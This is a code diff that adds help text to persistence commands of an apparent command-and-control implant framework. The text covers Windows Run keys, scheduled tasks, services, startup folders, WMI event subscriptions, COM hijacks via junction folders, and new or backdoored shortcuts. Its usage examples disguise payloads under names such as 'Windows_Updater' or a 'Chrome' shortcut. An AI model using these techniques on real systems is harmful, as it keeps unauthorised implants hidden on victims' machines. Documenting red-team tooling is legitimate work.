@@ -124,6 +124,21 @@ bind_flags_completer(cmd_registry_key,
                      { artifact_name = artifact_name_completer() })
 -- cmd_registry_key:Flags():Bool("clean_up", false, "clean_up")
 
+help("persistence:Registry_Key", [[
+Establish persistence via a Windows Registry Run key.
+
+**Usage:**
+
+```
+persistence Registry_Key --artifact_name my_beacon
+persistence Registry_Key --custom_file /path/to/payload.exe --drop_location "C:\Windows\Temp\svc.exe"
+persistence Registry_Key --use_malefic_as_custom_file --reg_key_name MyKey
+```
+
+> Payload source priority: `--artifact_name` > `--custom_file` > `--use_malefic_as_custom_file`.
+> Default registry key: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`.
+]])
+
 function run_scheduled_task(cmd, args)
     local taskname = cmd:Flags():GetString("taskname")
     local command = cmd:Flags():GetString("command")
@@ -172,6 +187,19 @@ cmd_scheduled_task:Flags():Bool("use_malefic_as_custom_file", false,
                                 "use current session's artifact as payload")
 bind_flags_completer(cmd_scheduled_task,
                      { artifact_name = artifact_name_completer() })
+
+help("persistence:Scheduled_Task", [[
+Establish persistence via a Windows Scheduled Task.
+
+**Usage:**
+
+```
+persistence Scheduled_Task --artifact_name my_beacon
+persistence Scheduled_Task --custom_file /path/to/payload.exe --taskname MyTask
+```
+
+> Payload source priority: `--artifact_name` > `--custom_file` > `--use_malefic_as_custom_file`.
+]])
 
 local function run_service_install(cmd, args)
     local session = active()
@@ -232,6 +260,19 @@ bind_flags_completer(cmd_service_install,
 cmd_service_install:Flags():String("command", persistdefaults.command,
                                    "Command to execute via the registry key")
 
+help("persistence:Install_Service", [[
+Establish persistence by installing a Windows service.
+
+**Usage:**
+
+```
+persistence Install_Service --artifact_name my_beacon
+persistence Install_Service --custom_file /path/to/payload.exe --service_name MySvc
+```
+
+> Payload source priority: `--artifact_name` > `--custom_file` > `--use_malefic_as_custom_file`.
+]])
+
 local function run_startup_folder(cmd, args)
     local use_current_user = cmd:Flags():GetBool(
                                  "use_current_user_startupfolder")
@@ -278,6 +319,20 @@ cmd_startup_folder:Flags():Bool("use_malefic_as_custom_file", false,
                                 "use current session's artifact as payload")
 bind_flags_completer(cmd_startup_folder,
                      { artifact_name = artifact_name_completer() })
+
+help("persistence:startup_folder", [[
+Establish persistence via the Windows startup folder.
+
+**Usage:**
+
+```
+persistence startup_folder --artifact_name my_beacon
+persistence startup_folder --custom_file /path/to/payload.exe --filename svc.exe
+```
+
+> Payload source priority: `--artifact_name` > `--custom_file` > `--use_malefic_as_custom_file`.
+> `--use_current_user_startupfolder` defaults to true (current user's startup folder).
+]])
 
 local function run_wmi_event(cmd, args)
     local session = active()
@@ -337,6 +392,20 @@ cmd_wmi_event:Flags():Bool("use_malefic_as_custom_file", false,
 bind_flags_completer(cmd_wmi_event,
                      { artifact_name = artifact_name_completer() })
 
+help("persistence:WMI_Event", [[
+Establish persistence via WMI Event Subscription.
+
+**Usage:**
+
+```
+persistence WMI_Event --artifact_name my_beacon
+persistence WMI_Event --custom_file /path/to/payload.exe --eventname MyEvent --attime startup
+```
+
+> Payload source priority: `--artifact_name` > `--custom_file` > `--use_malefic_as_custom_file`.
+> Default attime: startup.
+]])
+
 local function run_JunctionFolder(cmd, args)
     local session = active()
     local dllpath = cmd:Flags():GetString("dllpath")
@@ -382,6 +451,19 @@ cmd_junction_folder:Flags():Bool("use_malefic_as_custom_file", false,
                                  "use current session's artifact as payload")
 bind_flags_completer(cmd_junction_folder,
                      { artifact_name = artifact_name_completer() })
+
+help("persistence:Junction_Folder", [[
+Establish persistence via NTFS Junction Folder COM hijack.
+
+**Usage:**
+
+```
+persistence Junction_Folder --dllpath "C:\payload.dll" --guid "{CLSID}" --drop_location "C:\target"
+persistence Junction_Folder --artifact_name my_beacon --guid "{CLSID}"
+```
+
+> Requires administrator privileges. `--dllpath` and `--guid` are key parameters.
+]])
 
 local function run_newlnk(cmd, args)
     local session = active()
@@ -437,6 +519,18 @@ cmd_newlnk:Flags():Bool("use_malefic_as_custom_file", false,
                         "use current session's artifact as payload")
 bind_flags_completer(cmd_newlnk, { artifact_name = artifact_name_completer() })
 
+help("persistence:NewLnk", [[
+Create a new LNK (shortcut) file for persistence.
+
+**Usage:**
+
+```
+persistence NewLnk --artifact_name my_beacon --filepath "C:\Users\admin\Desktop" --lnkname "Chrome" --lnkicon "C:\chrome.ico"
+```
+
+> Creates a new shortcut file. Payload source priority: `--artifact_name` > `--custom_file` > `--use_malefic_as_custom_file`.
+]])
+
 local function run_backdoorlnk(cmd, args)
     local session = active()
     local lnkpath = cmd:Flags():GetString("lnkpath")
@@ -491,6 +585,19 @@ cmd_backdoorlnk:Flags():Bool("use_malefic_as_custom_file", false,
 bind_flags_completer(cmd_backdoorlnk,
                      { artifact_name = artifact_name_completer() })
 
+help("persistence:BackdoorLnk", [[
+Backdoor an existing LNK (shortcut) file for persistence.
+
+**Usage:**
+
+```
+persistence BackdoorLnk --lnkpath "C:\Users\admin\Desktop\Chrome.lnk" --command "C:\payload.exe"
+persistence BackdoorLnk --lnkpath "C:\Users\admin\Desktop\Chrome.lnk" --artifact_name my_beacon
+```
+
+> `--lnkpath` is required. Modifies the target of an existing shortcut.
+]])
+
 -- registry_key
 local function run_regkey_autorun(cmd)
     local reg_key_name = cmd:Flags():GetString("reg_key_name")
@@ -505,3 +612,16 @@ end
 local cmd_regkey = command("persistence:reg_key", run_regkey_autorun, "persistence by reg_key", "T1547.001")
 cmd_regkey:Flags():String("reg_key_name","Windows_Updater","reg_key")
 opsec("persistence:reg_key", 9.0)
+
+help("persistence:reg_key", [[
+Establish persistence via registry Run key using BOF (writes current implant path).
+
+**Usage:**
+
+```
+persistence reg_key
+persistence reg_key --reg_key_name CustomName
+```
+
+> Default key name: Windows_Updater. Adds current implant to HKCU Run key.
+]])
